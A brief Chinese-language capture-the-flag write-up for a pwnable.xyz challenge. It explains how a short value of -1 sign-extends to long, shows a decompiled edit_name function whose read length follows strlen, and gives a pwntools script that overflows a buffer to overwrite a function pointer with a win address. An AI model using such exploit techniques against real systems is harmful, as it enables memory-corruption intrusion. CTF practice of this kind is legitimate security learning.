short ---> long 类型转换

```c
short i = -1; // 0xffff
long j = (long) i; // 0xffffffffffffffff
```

代码：

```c
void edit_name(void)

{
  size_t __nbytes;
  
  __nbytes = strlen(cur);
  read(0,cur,__nbytes);
  return;
}
```



脚本:

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

p = remote('svc.pwnable.xyz', 30009)
# p = process('./challenge')

# 覆盖0-15字节
p.sendafter(b'Name:', b'a'*16)

# 输入错误答案，分数为-1（short）
# 覆盖16-17字节
p.sendlineafter(b'>', b'1')
line = p.recvuntil(b'=')
p.sendline(b'0')

# short --> long
# 覆盖16-23字节
p.sendlineafter(b'>', b'2')

# 调用edit_name
# 现在可以编辑位于24字节的函数指针了
win_addr = 0x4009d6
p.sendafter(b'>', b'3' + (b' ' * 0xf))
p.send((b'a' * 0x18) + p32(win_addr)[:-1])

# 调用win
p.sendlineafter(b'>', b'1')
p.interactive()


```

